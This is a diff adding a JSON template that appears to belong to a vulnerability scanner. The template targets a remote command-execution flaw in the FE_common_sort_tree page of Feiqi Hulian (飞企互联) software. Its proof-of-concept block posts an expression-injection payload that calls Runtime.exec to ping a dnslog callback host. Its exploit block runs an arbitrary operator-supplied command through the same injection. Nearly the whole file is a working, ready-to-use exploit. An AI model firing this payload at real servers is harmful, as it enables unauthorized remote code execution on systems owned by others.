@@ -1,0 +1,29 @@
+{
+  "name":"飞企互联FE_common_sort_tree命令执行",
+  "tag":"feiqihulian",
+  "type":"exec",
+  "poc": {
+    "pocGet": "/common/common_sort_tree.jsp;.js",
+    "pocPost": "rootName={%25Thread.@java.lang.Runtime@getRuntime().exec('ping -nc 1 {{dnslog}}')%25}",
+    "header": {
+      "Accept": "*/*",
+      "content-type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Linux;"
+    },
+    "status_code":"200",
+    "pattern": "(500\\.png)"
+  },
+  "exp": {
+    "step1": {
+      "expGet": "/common/common_sort_tree.jsp;.js",
+      "expPost": "rootName={%25Thread.@java.lang.Runtime@getRuntime().exec('{{command}}')%25}",
+      "header": {
+        "Accept": "*/*",
+        "content-type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Linux;"
+      },
+      "status_code":"200",
+      "pattern": "()"
+    }
+  }
+}
